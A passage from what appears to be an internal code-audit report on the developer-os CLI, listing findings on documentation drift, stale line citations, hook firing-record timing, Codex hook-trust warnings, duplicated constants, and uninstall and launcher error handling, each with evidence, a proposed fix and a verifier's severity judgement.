**Validation.** A test that loads workflows/*/workflow.yaml and compares the `scheduled` set with SCHEDULED_JOB_IDS must fail today (doctor) and pass after the fix.

**Verifier (downgraded).** The docs drift is real but the 'decorative/unenforced' logic claim is overstated. workflow-schema.md:142-145 (§7.2) still says 'both shipped contracts are manual-only' and that adding a non-manual trigger requires host-capability validation, while brain-garden declares scheduled and §2.4 (:48-51, added 2026-10-01 for NEW-134) records the binding: the brain-garden automation job runs that workflow's checks in product code. §2.4 never requires the converse (every automation job's workflow must declare scheduled). brain-reindex, brain-lint and git-sync are automation jobs with no workflow at all, so doctor declaring only manual contradicts no stated rule. That leaves stale prose: §7.2 conflicts with §2.4, and §8.9 says 'None of the six' when eleven workflows exist. This is low-severity docs drift, not a flow inconsistency.

### FLOW-DOCS-4 · docs-drift · Most identifier-bearing path:line citations in threat-model/knowledge-pipeline now point at the wrong lines

`docs/architecture/threat-model.md:189`

**Problem.** Both notes declare the 'every claim points at code, path:line' standard. tests/repository/citations.test.ts only checks that a cited range is in bounds. In the 112 citations whose doc line also names a code identifier, the cited lines no longer contain that identifier in 73 cases, measured with a script in this audit. The heuristic counts some test-name cells as noise, but the clear cases are on the security evidence column. Examples: mkdir 0o700 is cited at quarantine.ts:279, which is now `contents: string,` (actual: line 293). MAX_PROMPT_CONTENT_GRAPHEMES is cited at prompt.ts:13, which is `*/` (actual: 14). `ships no network capability` is cited at foundation.test.ts:1241, which is `return offences;` (actual: 1245). resolveText is cited at capture.ts:307-339, which is readConfig (actual: 348). buildCapture is cited at build.ts:209, a comment (actual: 216). PARTLY_APPLIED_RECOVERY is cited at ingest.ts:314-315, which is NOTE_CHANGED_RECOVERY. NEW-34 added the anchor form, but these two documents still use line form, so the threat model's evidence column silently mis-points.

**Evidence.**

```
Doc: threat-model.md:189 "| Quarantine is created private | `mkdir` with mode `0o700` (`apps/cli/src/commands/quarantine.ts:279`) |"; Code: `sed -n 279p apps/cli/src/commands/quarantine.ts` -> `  contents: string,`; `grep -n 0o700 apps/cli/src/commands/quarantine.ts` -> `293:  await context.fs.mkdir(directory, { recursive: true, mode: 0o700 });`. Doc: threat-model.md:1013 "`tests/e2e/foundation.test.ts:1241` — `ships no network capability`"; Code: foundation.test.ts:1245 `it("ships no network capability", async () => {`. Gate: tests/repository/citations.test.ts header "It resolves and bounds-checks ... **It cannot check that the cited lines mean what the sentence claims.**"
```

**Fix.** Convert the security-evidence citations in threat-model.md §5/§7 and knowledge-pipeline.md §5-§8 to the NEW-34 anchor form (`path` — `identifier`), which the gate checks by content. Alternatively, extend citations.test.ts so that when a doc line names a backticked identifier, the identifier must appear in the cited range.

**Validation.** Rerun this audit's script (count citations whose same-line identifier does not occur in the cited range); after the fix it should report about 0 for the §5/§7 tables.

**Verifier (downgraded).** Spot checks confirm the drift. threat-model.md:189 cites quarantine.ts:279, which is now `  contents: string,`, while 0o700 is at :293. threat-model.md:1013 cites foundation.test.ts:1241, but 'ships no network capability' is at :1245. The citations gate's header admits it 'cannot check that the cited lines mean what the sentence claims'. BACKLOG:55 says 'NEW-34's anchor form replaces line citations', yet these notes still use the line form, so the conversion was never done here; that is materially new evidence. The cited mechanisms still exist a few lines away and the security claims themselves stay true, so the impact is reader navigation, not a wrong security guarantee. Low.

### FLOW-DOCS-5 · docs-drift · foundation.md §1/§7/§8.9 Task-9 claims contradict later shipped surfaces and sibling docs

`docs/architecture/foundation.md:801`

**Problem.** Three foundation.md statements were never amended. (a) Line 65 says 'Four direct filesystem writes sit outside [transactions], and it is worth knowing all four'. Hook firing records are a product-home write outside any transaction (hooks.md §3.6), so the list is incomplete. (b) Line 801 says '**No scheduler, no Git mutation, no telemetry.**'. Plan 1b shipped launchd automation and git sync (foundation.md §10 itself, and threat-model.md §7 'Plan 1b removed two absences (Amended 2026-09-26)'), and §7's network bullet was amended while this one was not. (c) Line 856 (§8.9) says 'Configuration cannot be changed after init ... Foundation ships no command that edits it'. foundation-constraints.md:490 records it as 'Superseded 2026-09-21 by `config set`', and main.ts dispatches `config`.

**Evidence.**

```
Doc: foundation.md:801 "- **No scheduler, no Git mutation, no telemetry.**"; :856 "9. **Configuration cannot be changed after `init`.** ... Foundation ships no command that edits it"; :65 "it is worth knowing all four". Code: apps/cli/src/commands/automation/runner.ts:578 `case "brain-garden":` (scheduled jobs); apps/cli/src/commands/git/service.ts:1748 `const remote = await resolveRemote(request.remote, scope.brainPath);`; apps/cli/src/main.ts:849 `case "config": {`; apps/cli/src/hooks/firing-records.ts:127 `await handle.writeFile(text, "utf8");` (non-transactional). Sibling doc: foundation-constraints.md:490 "**Superseded 2026-09-21 by `config set`**".
```

**Fix.** Add dated amendments in place. In §7, mirror threat-model §7's 'Plan 1b removed two absences' and point to §10. In §8.9, mark it superseded by `config set` (2a95c94). In §1, either list the hook firing records (and any other runtime-record writes) or narrow 'all four' to the Foundation-era sites.

**Validation.** Cross-read foundation.md §7/§8 against threat-model.md §7 and foundation-constraints.md 'Residual 9': the three statements should agree.

**Verifier (confirmed).** Partly scoped, but real. foundation.md describes itself as 'Written at the close of Foundation Task 9', and §7 is titled 'What Foundation deliberately cannot do', so (a) 'all four' at :65 and (b) 'No scheduler, no Git mutation' at :801 can be read as Foundation-layer scope. The note does amend §7 elsewhere (the :781 network exception) without amending :801, though. (c) is unambiguous: §8.9 at :856 says 'Configuration cannot be changed after init ... Foundation ships no command that edits it', while foundation-constraints.md:490 records 'Superseded 2026-09-21 by `config set`' and the note itself carries no amendment. Low severity is correct.

### FLOW-DOCS-6 · docs-drift · brain.md §1 package map omits five source directories and miscounts lint classes

`docs/architecture/brain.md:21`

**Problem.** brain.md §1 says the table maps the package's responsibilities, and the note opens with 'Read this before changing Brain code'. The table lists schema/discovery/indexes/lint/retrieval/migrations/redact/service only. It omits capture/, garden/, ingest/, refactor/ and review/, which are the code behind §6.13-§6.15 and knowledge-pipeline §1. It also says lint covers 'the six classes below', while §3 and §6.4 enumerate eight.

**Evidence.**

```
Doc: brain.md:21 "| `src/lint/` | the six classes below, and canonical-form drift |"; :88 "### The eight lint classes". Code: `git ls-files packages/brain/src | grep -v test` lists capture/{agent,build,parse,render}.ts, garden/{bundle,proposal,select,validate}.ts, ingest/{apply,glob,prompt,proposal,validate}.ts, refactor/{links,merge,plan,split,vault}.ts and review/decide.ts, none of which appears in the §1 table.
```

**Fix.** Add rows for capture/, review/, ingest/, refactor/ and garden/, each pointing to knowledge-pipeline.md or brain.md §6.13/§6.15. Change 'six classes' to 'eight classes'.

**Validation.** Compare the §1 table's directories against `git ls-files packages/brain/src | cut -d/ -f4 | sort -u`.

**Verifier (confirmed).** Verified. The brain.md §1 table (lines 15-24) lists only schema, discovery, indexes, lint, retrieval, migrations, redact.ts and service.ts. `git ls-files packages/brain/src | cut -d/ -f4 | sort -u` also returns capture, garden, ingest, refactor and review, none of which the table lists. :21 says 'the six classes below', but the heading at :88 reads 'The eight lint classes'. This is minor docs drift.

### FLOW-INIT-2 · logic · Records for slow verbs (stop, format) are abandoned by the 1.5 s exit budget, so doctor reports them as 'never' or 'untrusted'

`apps/cli/src/bin.ts:198` · fixed in 0db6c0d2, in `apps/cli/src/hooks/entry.ts`; this line is the exit wait, unchanged by the fix (re-pointed 2026-10-07, NEW-193) · related: NEW-139, NEW-140

**Problem.** The wait for a pending record write is min(1400, 1500 − performance.now()), measured from process start. `stop` runs project-local tsc (TSC_TIMEOUT_MS 120 s) and `format` runs biome or prettier (30 s). Any run where the handler alone passes 1.5 s gets a wait of 0. The record write is still in lstat, the read or the admission gate, so the process exits before the write completes. An abandoned write also leaves no record_failed marker, by design. In any TypeScript repo where tsc takes more than about 1.3 s, the `stop` record is never written. doctor then shows `stop=never`. For Codex, `unfired` becomes true, which produces CODEX_UNTRUSTED_HOOK_MESSAGE and the 'approve it in Codex' recovery for a hook that fires and is trusted. hooks.md §3.6 notes that format and stop 'get the same budget' but not that this disables their observation.

_Merged CLI-LIFE-1 (apps/cli/src/hooks/entry.ts:56): Firing-record wait budget is measured from process start, so `stop` and `format` records are dropped whenever the hook ran longer than 1.5 s._

_Residual of NEW-139: the 1.4 s / 1.5 s bounds are deliberate (409346d3). This finding is about slow verbs that the bound still drops, not about re-opening the bound._

**Evidence.**

```
bin.ts:201 `if (pendingRecords.length > 0) await settleFiringRecords(pendingRecords, firingRecordWaitMs(performance.now()));`. entry.ts: `return Math.max(0, Math.min(FIRING_RECORD_EXIT_BOUND_MS, HOOK_EXIT_BUDGET_MS - elapsedMs));` with HOOK_EXIT_BUDGET_MS = 1_500. guards/child.ts:4 `export const TSC_TIMEOUT_MS = 120_000;`, :5 `FORMATTER_TIMEOUT_MS = 30_000`. adapter-claude/src/hooks.ts:25,27: `format` timeoutSeconds 35, `stop` 125. doctor.ts:789-791 `const unfired = vendor === "codex" && rows.some((row) => { const seen = lastSeen.get(row.verb); return seen === undefined || seen < writtenAt; });`
```

**Fix.** Base the budget on each verb's own vendor timeout (the hook row's timeoutSeconds minus a margin) instead of a global 1.5 s. Alternatively, start the record write (or at least the gate) before the handler for fail-open verbs, so its latency overlaps the handler.

**Validation.** Unit-test firingRecordWaitMs or its replacement with a `stop` verb and elapsed = 5000 ms, expecting a positive wait. Add an entry-level test where a stub stop handler sleeps 2 s and assert that `codex.stop.json` exists afterwards.

**Verifier (downgraded).** The mechanism is real. entry.ts:132-138 starts the record write in the finally block, after the handler has run. bin.ts:201 waits firingRecordWaitMs(performance.now()), which is 0 once 1.5 s have passed since process start. stop.ts runs tsc on every first stop in a repo with a tsconfig. The claim that the record is 'never written' is too strong, though: the second stop (stopHookActive, stop.ts:124) and runs in non-TS repos return fast and do record. hooks.md:465-466 also says outright that 'format and stop have longer timeouts and get the same budget', and NEW-139's residual names abandonment at the bound. So the design choice is documented; only its consequence for slow verbs is not. The impact is a misleading doctor warning, not a guard failure, so the severity drops to low.

### FLOW-INIT-3 · logic · 24 h refresh shortcut keeps a pre-render record, so doctor keeps telling the user to approve a Codex hook that is already trusted and firing

`apps/cli/src/hooks/firing-records.ts:100` · related: NEW-104

**Problem.** doctor treats a Codex record whose lastSeen is older than hooks.json's mtime as unfired, because 'a record older than the hooks file was left by the previous command bytes, which Codex re-gates'. recordHookFiring skips the write whenever a valid record is younger than 24 h, and it never looks at hooks.json. Scenario: the user runs `init` after a Node upgrade (executable=missing), so hooks.json is rewritten, Codex re-gates, and the user approves. The approved hook then fires, but its record (from earlier the same day) is not refreshed. For up to 24 h, doctor still warns with CODEX_UNTRUSTED_HOOK_MESSAGE and recovery CODEX_HOOK_TRUST_STEP. The two modules apply incompatible freshness rules to the same record.

**Evidence.**

```
firing-records.ts:100 `if (valid && request.now.getTime() - Date.parse(existing.lastSeen) < FIRING_RECORD_REFRESH_MS) return;`. doctor.ts readInstalledHooks: `writtenAt: (await context.fs.stat(path)).mtimeMs,`. doctor.ts:791 `return seen === undefined || seen < writtenAt;`
```

**Fix.** In recordHookFiring, also treat a record as due when lastSeen is older than the vendor's installed hooks.json mtime (one extra lstat). Alternatively, have init/attach delete that vendor's records when it rewrites hooks.json.

**Validation.** In firing-records.test.ts, write a record with lastSeen = T, touch a hooks.json with mtime T+1 min, call recordHookFiring at T+2 min, and expect lastSeen to be updated. Then expect doctor's `hooks` check to pass for Codex.

**Verifier (downgraded).** Verified. firing-records.ts:100 returns early for any valid record younger than FIRING_RECORD_REFRESH_MS and never consults hooks.json. doctor.ts:742 uses hooks.json's mtime as writtenAt, and doctor.ts:788-791 marks a Codex verb unfired when lastSeen < writtenAt. hooks.md:501-502 specifies that doctor rule, and hooks.md:508 mentions the fresh-record shortcut, but no document reconciles the two rules. The result is a false CODEX_UNTRUSTED_HOOK_MESSAGE that lasts up to 24 h after an init rewrites hooks.json. This is a diagnostic-only, self-clearing false warning, so the severity drops to low.

### FLOW-INIT-5 · duplication · review and ingest re-implement resolveQuarantine with private copies of QUARANTINE_SEGMENTS

`apps/cli/src/commands/review.ts:696` · related: NEW-20

**Problem.** quarantine.ts exports QUARANTINE_SEGMENTS and resolveQuarantine(context, config, paths, refuse), which capture and import use. review.ts and ingest.ts each redeclare `const QUARANTINE_SEGMENTS = ["_raw", "quarantine"]` and repeat the same contentRoot join and resolveContainedRoot call with the same message. Four writers and readers of one directory get their path from three definitions. A move of the quarantine folder or a change to the containment rule must be made in three places, or capture and import will write where review and ingest never read.

**Evidence.**

```
quarantine.ts:26 `export const QUARANTINE_SEGMENTS = ["_raw", "quarantine"] as const;`, review.ts:112 and ingest.ts:256 `const QUARANTINE_SEGMENTS = ["_raw", "quarantine"] as const;`. review.ts:696 and ingest.ts:2388 both call `resolveContainedRoot(context, contentRoot, join(contentRoot, ...QUARANTINE_SEGMENTS), "the quarantine directory resolves outside the content root", ...)`. capture.ts:679 and import.ts:555 use `resolveQuarantine(`.
```

**Fix.** Import QUARANTINE_SEGMENTS from quarantine.ts in review and ingest, and call resolveQuarantine with each command's refusal factory, using `canonicalQuarantine` from its result.

**Validation.** After the change, `grep -rn '"_raw", "quarantine"' apps/cli/src` should match only quarantine.ts. The existing review and ingest relocation-refusal tests stay green.

**Verifier (confirmed).** Verified. review.ts:112 and ingest.ts:256 redeclare QUARANTINE_SEGMENTS, which quarantine.ts:26 already exports. review.ts:690-702 and ingest.ts:2387-2395 repeat the contentRoot join and the resolveContainedRoot call that resolveQuarantine (quarantine.ts:77-84) wraps. The quarantine.ts docblock says it was 'Extracted from capture rather than copied, so the two entrances into quarantine cannot drift apart', yet the review and ingest readers still copy it. NEW-20 is closed and covers only the symlink race, not this duplication.

### FLOW-INIT-6 · duplication · Hook verb/vendor contract is declared twice (core contract.ts and cli argv.ts), held together only by a parity test

`apps/cli/src/hooks/argv.ts:1`

**Problem.** packages/core/src/hooks/contract.ts exports HOOK_GUARD_KINDS, HOOK_VENDORS, HookGuardKind, HookVendor and HookVerb, which renderHookCommand and hookCommandTail use when hooks are installed. apps/cli/src/hooks/argv.ts redeclares the same tuple and types for the runtime side, and firing-records.ts takes HOOK_GUARD_KINDS from argv.js even though it already imports from @developer-os/core. Avoiding a core import on the hook path cannot be the reason, because entry.ts and firing-records.ts both import core. Production code never reads core's HOOK_GUARD_KINDS and HOOK_VENDORS; only contract-parity.test.ts and index.test.ts do.

**Evidence.**

```
argv.ts:1-4 `export const HOOK_GUARD_KINDS = ["command", "path", "commit", "stop", "format", "prompt", "edit"] as const; ... export type HookVendor = "claude" | "codex";`. contract.ts:3-7 has the identical declarations. Running `grep -rn "HOOK_GUARD_KINDS\|HOOK_VENDORS" apps packages --include=*.ts | grep -v dist` shows that core's exports are used only by contract-parity.test.ts:3 and core's own tests.
```

**Fix.** Have argv.ts re-export HOOK_GUARD_KINDS and the types from @developer-os/core, and delete the local declarations and the parity test.

**Validation.** tsc -b stays green, and argv.ts no longer declares HOOK_GUARD_KINDS (grep).

**Verifier (confirmed).** Verified. argv.ts:1-4 redeclares HOOK_GUARD_KINDS and the hook types from core contract.ts:3-7. firing-records.ts:16 takes HOOK_GUARD_KINDS from argv.js while also importing @developer-os/core (lines 11-12), and entry.ts:3 imports core too, so keeping core out of the hook path cannot be the reason. contract-parity.test.ts:10-12 is the only guard against drift, so there is no current bug and the severity stays low. The proposed fix overstates one point: contract-parity.test.ts also checks HOOK_EVENT_OF and HOOK_TOOL_MATCHERS against the adapter rows, so only its first case could go, not the whole file.

### FLOW-INIT-7 · inconsistency · capture slugs the cwd basename while inject slugs the project root, so one project gets two slugs

`apps/cli/src/commands/capture.ts:653`

**Problem.** hooks.md §3.4.1 defines the project slug as slugify(basename(<project root>)), with the root found by resolveProjectRoot's walk up to `.git`. capture writes `projectSlug: slugify(basename(workingDirectory))` from the raw cwd. A capture taken in `repo/apps/cli` is filed as project `cli`, while the SessionStart inject for the same session looks up `repo`. Nothing downstream reads the envelope's projectSlug (ingest's prompt omits it), so today the field is metadata that disagrees with the only other slug in the product.

**Evidence.**

```
capture.ts:653 `projectSlug: slugify(basename(workingDirectory)),`; inject.ts:48-49 `const root = await resolveProjectRoot(runtime.cwd); const text = composeInjection(await service.sessionContext(slugify(basename(root))));`. `grep -rn projectSlug packages/brain/src/ingest apps/cli/src/commands/ingest.ts` finds no non-test reader.
```

**Fix.** Derive capture's slug from `resolveProjectRoot(workingDirectory)`, which apps/cli/src/hooks/project-root.ts already exports, so both sides use one definition of 'project'.

**Validation.** Add a capture.test.ts case that runs from a subdirectory of a fixture with a `.git` marker and asserts projectSlug equals the root's slug.

**Verifier (downgraded).** The code matches. capture.ts:653 uses slugify(basename(workingDirectory)), and inject (hooks.md:410) uses the project root. But capture's slug is documented as derived from the working directory (packages/brain/src/capture/build.ts:15 and the UNNAMED_PROJECT note in apps/cli/src/project-slug.ts), so the difference is an earlier deliberate definition, not a broken flow. The finding itself shows that no production code reads the envelope's projectSlug for any decision, so there is no behavioral impact. It is accurate but immaterial; keep it at low or drop it.

### FLOW-UNINST-3 · logic · A bad codex/codex-home record crashes doctor with no report and blocks uninstall, with no recovery

`apps/cli/src/commands/doctor.ts:1719`

**Problem.** readRecordedCodexHome throws a plain Error when <home>/codex/codex-home is a symlink (O_NOFOLLOW), foreign-owned, larger than 4096 bytes or missing its trailing newline. collectFindings calls resolveVendorHomes outside any `guarded` boundary, and so does runScheduledDoctorReport (line 1910). The throw escapes doctor completely: bin.ts prints only `developer-os failed: Error` with exit 1 and no report. That breaks the contract 'Every doctor check has its own error boundary … an escaping rejection there became … no report at all' (foundation.md:711-713). The same unclassified Error escapes every uninstall arm (readUninstallManifest, admitV2Home, planUninstallDetach) and the mutation gate, so the uninstall that would delete this record (a codex-owned manifest row written by attach.ts:580) cannot run, and no command names the fix. init's post-install verify (runDoctorReport) would throw the same way.

**Evidence.**

```
doctor.ts:1719 `const homes = resolveVendorHomes(context.env, context.userHome, paths.home);` (top of collectFindings, not inside guarded); vendor-homes.ts:35-44 `throw new Error(`the recorded Codex home ${path} is unreadable`...)` / `throw new Error(`the recorded Codex home ${path} is not an owned regular file`)`; uninstall-recovery.ts:117 and commands/uninstall.ts:689 call resolveVendorHomes inside admission with no classification; bin.ts:172-181 last-resort `developer-os failed: ${error.name}`.
```

**Fix.** Have readRecordedCodexHome throw a typed refusal (e.g. LifecycleRecoveryRequiredError('codex_home_record_shape', [path])) with a remove-the-file recovery. In doctor, resolve homes inside guarded (or fall back to codexHomeFromEnv and add a failing `codex-home-record` finding), so the rest of the report still renders.

**Validation.** Replace codex/codex-home with a symlink and run `doctor --json`. Today it exits 1 with no JSON. After the fix every check should render and one should fail naming the record path. Run uninstall on the same home and expect a typed refusal with recovery text.

**Verifier (downgraded).** Real. readRecordedCodexHome (instructions/vendor-homes.ts:29-48) throws a plain Error. collectFindings calls resolveVendorHomes at doctor.ts:1719 outside `guarded`, and runDoctor has no try around collectFindings, so bin.ts:172-181 prints only `developer-os failed: Error`. That breaches foundation.md:711-713. Overstated: uninstall does not crash. runUninstall's catch-all (commands/uninstall.ts:942-960) turns the error into a failureFrom result, which only lacks recovery text. The trigger also requires tampering with an owned file inside the product home (a symlink, a foreign owner, more than 4 KiB, or no trailing newline). Hence low.

### FLOW-UNINST-4 · inconsistency · Detach planning makes a missing or invalid config.toml block uninstall, against the uninstall config contract

`apps/cli/src/lifecycle/uninstall.ts:1927`

**Problem.** uninstallRuntimePaths states 'A drifted or corrupted configuration must not block removal', and deriveVariant swallows readConfigFile errors. planUninstallDetach runs first on every V2 home with a claude/codex row (runCoordinatorUninstall line 740, before any preview). It reads config.toml through guards.readText and loadConfig with no fallback. A deleted config.toml makes readText throw SecurityRefusalError('Unable to verify readable file identity'), so uninstall exits 5 as a security refusal. The drained uninstall alone tolerates a missing config row: planUninstall skips `missing` drift. The config is only read so detach can rewrite `adapters` in a file that the same uninstall deletes a moment later.

**Evidence.**

```
lifecycle/uninstall.ts:1927-1938 `const text = await context.guards.readText(context.paths.configFile, ...); ... config: loadConfig(text),`; commands/uninstall.ts:720-722 doc `A drifted or corrupted configuration must not block removal, and must not widen it either`; security/protected-paths.ts:109-112 `catch { throw new SecurityRefusalError("Unable to verify readable file identity"); }`; commands/uninstall.ts:416-418 planUninstall filters `finding.kind !== "missing"`.
```

**Fix.** When planUninstallDetach is called for uninstall, skip the config rewrite if the config is absent or does not validate: there is no adapters flip to plan in a file the drained uninstall removes. Alternatively, map the read failure to an UninstallRefusal with a precise message, never a security refusal.

**Validation.** On a V2 fixture with Claude rows, delete config.toml and run `uninstall --yes`. Today it exits 5. After the fix it should complete, or refuse with exit 6 and a config-specific message.

**Verifier (downgraded).** Partly real. planUninstallDetach (lifecycle/uninstall.ts:1927-1938) reads config.toml through guards.readText with no fallback. ProtectedPathPolicy.readText throws SecurityRefusalError when stat fails (protected-paths.ts:108-112). It runs on every V2 home that has a claude or codex row (commands/uninstall.ts:763), before the drained uninstall, which tolerates `missing` drift. The `invalid config` half is wrong: an edited config.toml is non-missing drift and is refused exit 3 by planUninstall anyway. The quoted contract comment covers only the path authority in uninstallRuntimePaths. What is left is the narrow case of a deleted config.toml on a vendor-attached home, which is a refusal with a misleading class, not data loss. Hence low.

### FLOW-UNINST-6 · docs-drift · foundation.md's 'full check set' for doctor omits half the checks

`docs/architecture/foundation.md:714`

**Problem.** The architecture note states the full doctor check set as 11 ids plus bootstrap-evidence rows. collectFindings emits release-trust, entrypoint, hooks, external-hooks, vendor-config, instructions, codex-registration and manifest-anchor as well. It also omits that `transactions` covers coordinator participant journals (see FLOW-UNINST-1). Readers and init's verification consumers rely on this list to know what doctor diagnoses.

**Evidence.**

```
foundation.md:714-716 `**The full check set is `platform`, `product-home`, `configuration`, `manifest`, `transactions`, `drift`, `brain`, `redaction-key`, `agents`, `claude-capabilities`, `codex-capabilities`, and one `bootstrap-evidence:<id>` row per retained bootstrap envelope**`; doctor.ts:1779-1838 additionally emits `release-trust`, `entrypoint`, hookFindings (`hooks`, `external-hooks`), `checkVendorConfig`, `instructions`, `codex-registration`, manifestAnchorFindings.
```

**Fix.** Replace the enumerated list with the current ids, or point to collectFindings as the source of truth, and mark which checks are never `fail` (hooks, external-hooks, vendor-config, entrypoint).

**Validation.** Run `doctor --json` on a healthy V2 home and compare the check ids with the doc list.

**Verifier (confirmed).** foundation.md:714-716 calls its 11-id list plus bootstrap-evidence rows 'the full check set'. collectFindings also emits guarded checks `release-trust`, `instructions` and `codex-registration`, plus the hooks/external-hooks, vendor-config, entrypoint and manifest-anchor findings. Other architecture docs (claude-adapter.md:157/524, hooks.md:298, foundation.md:1514) document those checks individually, so only this enumerated 'full' list is stale. The drift is low impact.

### FLOW-UPD-4 · inconsistency · The launcher's trust compiler swallows validation errors, so roots without redirect origins silently turn off the FD 3 handoff

`apps/launcher/src/handoff.ts` (the FD 3 write was removed by Task 11b Task 12, `6269550f`, 2026-10-07) · related: NEW-111

**Problem.** compileLauncherOfflineReleaseTrust's docblock says it returns null only when no root is decided or none is `online_current`. But it wraps validateOfflineReleaseTrust in a catch-all, and that validation requires 1 to 4 `metadataRedirectOrigins`. main.ts compiles LAUNCHER_METADATA_REDIRECT_ORIGINS = []. When Task 11b fills in the roots but not the origins (or gets any field wrong), the launcher quietly sends no FD 3. Today that leads to the abort in FLOW-UPD-1. After that fix, it becomes a refusal that looks like 'no trust configured' instead of an error about the launcher's own build.

**Evidence.**

```
apps/launcher/src/handoff.ts:56-71 `if (onlineRoot === undefined) return null; try { return validateOfflineReleaseTrust({...metadataRedirectOrigins: input.metadataRedirectOrigins}); } catch { return null; }`
packages/core/src/update/release.ts:332 `const metadataRedirectOrigins = array(input.metadataRedirectOrigins, "OfflineReleaseTrustV1.metadataRedirectOrigins", 1, 4)...`
apps/launcher/src/main.ts:48 `const LAUNCHER_METADATA_REDIRECT_ORIGINS: OfflineReleaseTrustV1["metadataRedirectOrigins"] = [];`
```

**Fix.** Return null only when no `online_current` root exists. Once roots are set, let a validateOfflineReleaseTrust failure propagate as a launcher build error (non-zero exit with a message) instead of downgrading to 'no trust'.

**Validation.** Unit test: compileLauncherOfflineReleaseTrust({acceptedRoots:[onlineRoot], metadataRedirectOrigins:[]}) throws rather than returning null.

**Verifier (downgraded).** Confirmed: handoff.ts:57-70 wraps validateOfflineReleaseTrust in a bare `catch { return null; }`, and main.ts:48 compiles empty metadataRedirectOrigins. The docblock only names the case where no online_current root exists, so the catch-all goes beyond its stated contract. I lowered it to low because it is fully latent: it only matters once Task 11b fills in the roots (NEW-111). It is a build-constant misconfiguration that the first real-roots launcher test would expose (handoff.test.ts already asserts non-null trust when origins are supplied). It is not a runtime bug.

### FLOW-UPD-6 · dead-code · The security update barrel re-exports values that no consumer can reach

`packages/security/src/update/index.ts:19` · removal confidence: medium

**Problem.** @developer-os/security exposes only "." (dist/index.js), and packages/security/src/index.ts re-exports only a subset of update/index.ts. Several value re-exports in update/index.ts are therefore unreachable from outside the package, and no in-package code imports them through the barrel. In-directory tests import the source files directly. The dead part is these re-export lines, not the functions themselves.

**Evidence.**

```
packages/security/package.json `"exports": { ".": { ... "default": "./dist/index.js" } }`.
`git grep -lw <sym> -- '*.ts' ':!packages/security/src/update/*' ':!**/dist/**'` = 0 files for: expectedUstarBytes, MAXIMUM_ZSTD_WINDOW_LOG, deriveReleaseScratchCleanupList, parseReleasePlanningAttemptId, releasePlanningScratchPaths, validateReleasePlanningScratch, validateReleasePlanningScratchJournal, validateReleaseScratchEntryEvidence, blankPlannerModule, scanPlannerModule, screenPlannerFrame. update/index.ts:19 `export { expectedUstarBytes, MAXIMUM_ZSTD_WINDOW_LOG, ZstdUstarAdmission } from "./archive.js";`
```

**Fix.** Remove these names from update/index.ts. Keep the functions, which are used inside their own modules and tests.

**Validation.** tsc -b and eslint stay green; packages/security/src/index.ts does not reference the removed names.

**Verifier (confirmed).** packages/security/package.json exports only ".", and packages/security/src/index.ts:72-87 re-exports from update/index.js only a subset that excludes the listed names. Grepping each of the 11 symbols outside packages/security/src/update/ and dist returns zero code hits. The only hits are expectedUstarBytes and MAXIMUM_ZSTD_WINDOW_LOG in docs/architecture/foundation-constraints.md:645-646, and those point at archive.ts, not at the barrel. The only file that imports update/index is packages/security/src/index.ts (plus index.test.ts, which exercises the top-level barrel). So these re-export lines are unreachable.

### MACOS-2 · flow · Hash-bound launchctl argv grammar (`argvAlternatives`, argv slots) is never consulted; each executor hardcodes its argv

`packages/platform-macos/src/launchd/process-table.ts:258` · related: NEW-138

**Problem.** The mutation and preview tables bind argv grammars with slots (`launchd_gui_domain`, `launchd_bootstrap_plist_path`, ...) into `processTableHash` and the template hash. No code expands those slots, and `requireLaunchdMutationTable` only compares hashes. `LaunchdObserver`, `LaunchdPathBootstrapper` and `LaunchdBootoutRunner` each build their argv as literals, so the pinned contract and the executed command can drift apart silently. The git side does the opposite: it expands `edge.argvAlternatives` through `expandGitArgv` before spawning.

**Evidence.**

```
grep -rn argvAlternatives apps packages (non-test, non-dist) shows no consumer under platform-macos except process-table.ts itself. Literals: observe.ts:201 `argv: ["print", target]`, bootstrap.ts:300 `["bootstrap", request.domain, request.source.path]`, effects.ts:266 `argv: ["bootout", target]`. process-table.ts:258 `argvAlternatives: Object.freeze([BOOTOUT, BOOTSTRAP, PROBE_DOMAIN, PROBE_SERVICE] as const)`.
```

**Fix.** Either add a small `expandLaunchdArgv(table, id, slots)` and have all three executors spawn from `table.argvAlternatives`, or drop the argv grammar from the hashed table and state in the spec that argv is code-pinned. The first option keeps the hash meaningful.

**Validation.** Unit test: mutate one literal in a table copy, for example `bootstrap` to `kickstart`. Today `requireLaunchdMutationTable` fails but the executors would still spawn the old argv. After the fix, the spawned argv must equal the expanded table argv.

**Verifier (downgraded).** Real. The hashed argv grammar (process-table.ts:258) has no consumer in platform-macos, while observe.ts:201, bootstrap.ts:300 and effects.ts:266 hardcode the argv. Git expands its grammars through expandGitArgv. But both sides are frozen code constants, and process-table.test.ts:131-136 pins the exact grammar, so drift needs a code edit that a review would see. This is a design inconsistency, not a reachable bug.

### MACOS-3 · inconsistency · MacOsTransactionLock*Error carry no exit `code`, breaking the CLI contract; the busy/operational split is also flattened

`packages/platform-macos/src/transaction-lock.ts:58`

**Problem.** `exitCodeOf` documents that every layer below the CLI raises errors carrying the exit code they claim, and every other error in this package does (`MacOsPlatform*`, `Launchd*`, `MacOsRetainedRename*`, core `LifecycleLockBusyError` = recoveryRequired). The two transaction-lock errors have no `code`, so a contended lock (lockf exit 75) surfaces as a generic operationalFailure. The only in-repo consumer, `TransactionStore.withTransactionLock`, swallows both classes into one 'transaction lock is unavailable' message. The stable-lock provider in the same package uses core's coded errors instead, so the package has two lock error taxonomies.

**Evidence.**

```
transaction-lock.ts:58-70 `export class MacOsTransactionLockUnavailableError extends Error { constructor() { super("transaction lock is unavailable"); this.name = ...` with no `readonly code`. apps/cli/src/context.ts:471 `An error without one is an operational failure`. packages/core/src/transactions/store.ts:219-221 `} catch { throw new TransactionStateError("transaction lock is unavailable"); }`. The effect-journal lock path (effect-journal.ts:481 `return this.#dependencies.locks.acquire(...)`) propagates the raw error.
```

**Fix.** Give `MacOsTransactionLockUnavailableError` a `code` (recoveryRequired, matching `LifecycleLockBusyError`, or capabilityUnavailable) and `MacOsTransactionLockOperationalError` operationalFailure. Better, reuse core's `LifecycleLockBusyError`/`LifecycleLockUnavailableError` classes as `MacOsStableLockProvider` does. Let `withTransactionLock` rethrow coded errors instead of catching everything.

**Validation.** Test: with a held lock, `exitCodeOf(await acquire(...).catch(e => e))` must equal the chosen code. A launchd effect apply against a locked journal must exit with that code, not 1.

